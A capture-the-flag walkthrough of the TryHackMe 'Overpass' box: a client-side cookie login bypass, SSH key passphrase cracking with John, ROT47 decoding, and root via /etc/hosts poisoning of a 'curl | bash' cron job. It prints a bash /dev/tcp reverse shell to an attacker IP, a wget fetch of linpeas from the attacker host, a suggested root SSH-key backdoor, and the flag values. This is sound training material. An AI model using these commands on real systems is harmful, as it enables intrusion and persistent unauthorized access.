---
title: "Overpass"
description: "An easy boot2root box where a broken cookie-check in the admin login, an encrypted SSH key cracked by John, and a world-writable /etc/hosts file exploited against a root cron job lead to both flags."
difficulty: "Easy"
tags: ["Broken Authentication", "Cookie Bypass", "ROT47", "SSH Key Cracking", "John the Ripper", "Cron Job", "/etc/hosts", "Reverse Shell"]
date: "2026-08-05"
---

## Overview

Overpass is an easy Linux box that kicks off the Overpass series on TryHackMe. It tells the story of a group of broke computer science students who built a cross-platform password manager with "military grade cryptography" - which turns out to be ROT47, a cipher Julius Caesar would blush at. The foothold comes from broken authentication on the admin login, the user flag from an encrypted SSH key cracked with John the Ripper, and root from a cron job that blindly pipes a remote script to bash - redirected through a world-writable `/etc/hosts` file.

## Room Information

- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Category:** boot2root
- **Skills Learned:** Manual cookie authentication bypass, source code review, ROT47 decoding, encrypted SSH key cracking, exploiting a root cron job via DNS redirection

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oN nmap.txt <target-ip>
```

![Nmap scan results](/assets/screenshots/overpass/nmap.png)

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 7.6p1 Ubuntu |
| 80/tcp | HTTP | Apache httpd 2.4.29 (Golang net/http backend) |

Port 22 alone is unreachable without credentials, so enumeration moves to the web server.

### The Overpass Website

Port 80 hosts a marketing page for Overpass - the password manager:

![Overpass homepage](/assets/screenshots/overpass/homepage.png)

The homepage source contains a telling developer comment mocking the "military grade" encryption:

```html
<p>Overpass allows you to securely store different
    passwords for every service, protected using military grade
    <!--Yeah right, just because the Romans used it doesn't make it military grade, change this?-->
    cryptography to keep you safe.
</p>
```

"Just because the Romans used it" is a reference to **Caesar ciphers** - a hint that the "encryption" is classical substitution, not real cryptography.

### Directory Brute-Force

```bash
gobuster dir -u http://<target-ip> -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o gobuster.log
```

![Gobuster results](/assets/screenshots/overpass/gobuster.png)

Gobuster returns `/admin`, `/css`, `/downloads`, `/img` and `/aboutus`. The `/admin` endpoint is the interesting one.

![Admin login page](/assets/screenshots/overpass/admin_login.png)

The admin page asks for credentials. The room hint says: "OWASP Top 10 Vuln! Do NOT brute force." So instead of guessing passwords, we look at the JavaScript powering the login form.

## Web Exploitation - Broken Authentication

The admin page loads three scripts: `main.js`, `cookie.js` (a third-party cookie framework) and `login.js` (custom logic). Reading `login.js` reveals the entire authentication flow:

![login.js source](/assets/screenshots/overpass/login_js.png)

```javascript
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

The logic is flawed in the best possible way for an attacker: the server response is only ever compared against the literal string `"Incorrect credentials"`. If the response is anything else, the code sets a `SessionToken` cookie with the response body and redirects to `/admin`.

The server-side /api/login endpoint presumably rejects wrong credentials. But the client makes the decision, and the client trusts anything that isn't the failure string.

### Setting the Cookie Manually

The bypass is trivial - use the console of the developer tools to create the cookie directly:

```javascript
Cookies.set("SessionToken", "anything")
```

![Setting the SessionToken cookie](/assets/screenshots/overpass/set_cookie.png)

Refresh the page and the admin panel loads:

![Admin panel with the private key](/assets/screenshots/overpass/admin_sshkey.png)

The admin panel hands over an encrypted SSH private key for the user **james**, complete with a cheeky note about the key's password.

## Initial Access - Cracking the SSH Key Passphrase

### Saving the Key

The key must be saved to a file (with a trailing newline!) and given restrictive permissions - SSH refuses to use a private key with group/other read permission:

```bash
cat > james-key << 'EOF'
-----BEGIN RSA PRIVATE KEY-----
...the full key from the admin panel...
-----END RSA PRIVATE KEY-----
EOF
chmod 600 james-key
```

![Saving the key](/assets/screenshots/overpass/copy_key.png)

![Connecting with the key](/assets/screenshots/overpass/ssh_key_auth.png)

Trying to connect immediately hits a wall - the key is passphrase-protected:

```
Enter passphrase for key 'james-key':
```

An encrypted key with this structure (a `Proc-Type: 4,ENCRYPTED` header followed by `DEK-Info: AES-128-CBC,<hex-iv>`) tells us OpenSSL encrypted it with a passphrase. Since the admin page explicitly suggested the password is forgettable, we brute force it.

### ssh2john + John the Ripper

John the Ripper doesn't understand SSH keys directly, but the `ssh2john` helper converts the key into a crackable hash. Then John cracks it with the rockyou wordlist:

```bash
/usr/share/john/ssh2john.py james-key > ssh.hash
john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![John the Ripper cracking the key](/assets/screenshots/overpass/john_crack.png)

```
james13          (ssh-key)
Session completed.
```

### SSH Access

```bash
ssh -i james-key james@<target-ip>
Enter passphrase for key 'james-key': james13
```

### User Flag

```bash
james@overpass-prod:~$ cat user.txt
thm{65c1aaf000506e56996822c6281e6bf7}
```

The user flag is captured.

## Privilege Escalation

### James's Home Directory

```bash
james@overpass-prod:~$ ls -la
total 56
drwxr-xr-x 5 james james 4096 ...
-rw-r--r-- 1 james james    65 Jun 27 04:45 .overpass
-rw-r--r-- 1 james james    33 Jun 27 04:45 user.txt
-rw-r--r-- 1 james james   316 Jun 27 04:45 todo.txt
```

![James's home directory](/assets/screenshots/overpass/overpass_home.png)

The `todo.txt` file is a goldmine of foreshadowing:

```
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

Two useful facts: James stored his password in his own password manager, and there is an "automated build script" somewhere.

### The .overpass Password File

Remember the source code downloaded from the Downloads page earlier - it's the actual Go source of the Overpass password manager:

![Downloads page source](/assets/screenshots/overpass/downloads_source.png)

The source reveals that "military grade encryption" is **ROT47** - every printable ASCII character shifted by 47 in a Caesar fashion:

```go
func rot47(input string) string {
    var result []string
    for i := range input[:len(input)] {
        j := int(input[i])
        if (j >= 33) && (j <= 126) {
            result = append(result, string(rune(33+((j+14)%94))))
        } else {
            result = append(result, string(input[i]))
        }
    }
    return strings.Join(result, "")
}
```

The saved passwords are stored in `~/.overpass` - which is exactly what the hidden dotfile in james's home directory is. Decode it with any ROT47 tool (CyberChef has a ready recipe):

```bash
james@overpass-prod:~$ cat .overpass
,LQ?2>6QiQ;2>6DQ[QA2DDQiQ;2>6D`bQN.
```

![ROT47 decoding james's password](/assets/screenshots/overpass/rot47_decode.png)

ROT47-decoding returns the plaintext password: `james13` - the same password that unlocked the SSH key.

### Checking Sudo and Crons

```bash
james@overpass-prod:~$ sudo -l
```

![sudo -l output](/assets/screenshots/overpass/sudo_l.png)

`sudo -l` shows james has no sudo privileges - there is no one-shot misconfiguration there. Automated enumeration is the next step. LinPEAS is transferred, then run from the box:

```bash
python3 -m http.server 80            # attacker machine
cd /tmp; wget http://<attacker-ip>/linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh
```

![Transferring linpeas](/assets/screenshots/overpass/linpeas_transfer.png)
![Running linpeas](/assets/screenshots/overpass/linpeas_run.png)

LinPEAS flags a cron job running as root every minute:

```
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

![The root cron job](/assets/screenshots/overpass/crontab.png)

Every minute, root fetches `buildscript.sh` from a hostname called `overpass.thm` and **pipes it straight into bash**. Two details make this world-exploitable:

1. The domain `overpass.thm` is not a real DNS domain - it must be resolved via `/etc/hosts`.
2. The cron job uses `curl` without `--insecure` present - it just fetches whatever the resolver returns (it's HTTP, no TLS).

### What's Actually Being Called

The current `/etc/hosts` maps `overpass.thm` to the box itself (`127.0.0.1`), so the cron job fetches the legitimate build script from the local web server. The point of the entry: whatever host `overpass.thm` resolves to, the cron job downloads and **pipes to bash**, no questions asked.

### The /etc/hosts Weakness

Looking at the file that decides where `overpass.thm` points:

```bash
james@overpass-prod:~$ ls -l /etc/hosts
-rw-rw-rw- 1 root root 250 Jun 27 02:39 /etc/hosts
```

![The world-writable /etc/hosts file](/assets/screenshots/overpass/etc_hosts.png)

`/etc/hosts` is **world-writable** (`rw-rw-rw-`) - any user of the box can redirect the resolution of any hostname.

### Poisoning the Domain

The attack is straightforward:

1. Change `overpass.thm` to point to the attacker's IP in `/etc/hosts`.
2. Serve a malicious `buildscript.sh` from the exact path the cron job requests (`/downloads/src/`) on the attacker machine.
3. Wait for the next minute tick - the cron job runs as root, fetches our script, and executes it.

```bash
# As the james user, on the box - no sudo needed, the file is world-writable:
nano /etc/hosts   # replace 127.0.0.1 overpass.thm with <attacker-ip>
```

![Modifying /etc/hosts](/assets/screenshots/overpass/hosts_modified.png)

### The Malicious buildscript

On the attacker, the file structure must mirror the cron job's URL exactly: `downloads/src/buildscript.sh`):

```bash
mkdir -p downloads/src
cd downloads/src
cat > buildscript.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
EOF
```

This is a standard Bash reverse shell - no Python quirks, attacker IP swapped in. (The original room solvers use either this or the `python3 -c 'import socket,subprocess,os;...'` one-liner - both work; Bash's `/dev/tcp` is simpler.)

Start a simple HTTP server on port 80 in the parent directory of `downloads/`:

```bash
python3 -m http.server 80
```

![Attacker HTTP server](/assets/screenshots/overpass/http_server.png)

### The Root Shell

Start a Netcat listener on the attacker machine:

```bash
nc -nvlp 4444
```

![Starting the listener](/assets/screenshots/overpass/nc_listener.png)

Wait one minute for the cron tick. The HTTP server logs the fetch - root has downloaded our script and bash has executed it happily. The listener catches the callback:

![Reverse shell as root](/assets/screenshots/overpass/root_shell.png)

```bash
# whoami
root
# cd /root && cat root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}
```

**Root flag:** `thm{7f336f8c359dbac18d54fdd64ea753bb}`

## Flags

| Flag | Location | Value |
|------|----------|-------|
| User | `/home/james/user.txt` | `thm{65c1aaf000506e56996822c6281e6bf7}` |
| Root | `/root/root.txt` | `thm{7f336f8c359dbac18d54fdd64ea753bb}` |

## Commands Used

```bash
# Enumeration
nmap -sC -sV -oN nmap.txt <target-ip>
gobuster dir -u http://<target-ip> -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o gobuster.log

# Admin bypass
Cookies.set("SessionToken", "anything")   # in the browser console

# Crack the SSH key (when the passphrase is lost... or unknown)
/usr/share/john/ssh2john.py james-key > ssh.hash
john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt

# SSH access
chmod 600 james-key
ssh -i james-key james@<target-ip>   # passphrase: james13

# Decrypt James's password (military grade!)
python3 -c "print(''.join(chr(33+((ord(c)-33+47)%94)) if 33<=ord(c)<=126 else c for c in open('.overpass').read()))"

# Privilege escalation
cat /etc/crontab   # the root cron job
nano /etc/hosts    # overpass.thm => attacker IP
python3 -m http.server 80   # serving downloads/src/buildscript.sh
nc -nvlp 4444               # catching the root shell
```

## Lessons Learned

- **Broken authentication doesn't need a password when the client side checks the value against one string.** Delegating the authorization test to the client ("anything except 'Incorrect credentials' is success") turns the admin form into a cookie-stamper. Reading `login.js` is a two-line advertisement - ignoring it = blind brute force.
- **Never trust "military grade" marketing.** The site's own marketing and the source code are the truth: ROT47 is an ASCII-shift cipher. The minute a password manager or binary says "encrypted" but the source does a rotate, decode everywhere with a one-line Python.
- **SSH keys come in encrypted flavors - and ssh2john knows them all.** `Proc-Type: 4,ENCRYPTED` + `DEK-Info: AES-128-CBC` means the key itself is OpenSSL/passphrase output. A weak passphrase survives microseconds against rockyou via John the Ripper.
- **Cron + remote-piping + DNS override = root.** A root cron job that does `curl domain/script.sh | bash` is only as safe as DNS resolution of that name. World-writable `/etc/hosts` is one of the few "rewrite DNS" primitives available to an unprivileged user. Redirection to your own HTTP server + Netcat listener = root shell in 60 seconds.
- **Alternatives exist**: instead of a reverse shell, the same cron flow could place an SSH public key into `/root/.ssh/authorized_keys` for a cleaner permanent root backdoor (as some solvers do), or SUID `/bin/bash` then `bash -p`. The technique is the same - what you put in buildscript.sh determines your foothold.

## References

- [TryHackMe - Overpass](https://tryhackme.com/room/overpass)
- [John the Ripper - ssh2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)
- [John the Ripper](https://www.openwall.com/john/)
- [CyberChef - ROT47](https://gchq.github.io/CyberChef/#recipe=ROT47())
- [OWASP Top 10 - Broken Authentication](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication)
- [GTFOBins](https://gtfobins.github.io)
- [Steflan's Security Blog - Overpass walkthrough](https://steflan-security.com/tryhackme-overpass-walkthrough/)
- [Jacen Sekai - Overpass Walkthrough](https://jacen.moe/blog/20210816-tryhackme-overpass-writeup/)
- [Infosec Writeups - Overpass Walkthrough](https://infosecwriteups.com/overpass-write-up-walkthrough-95656cee4c0b)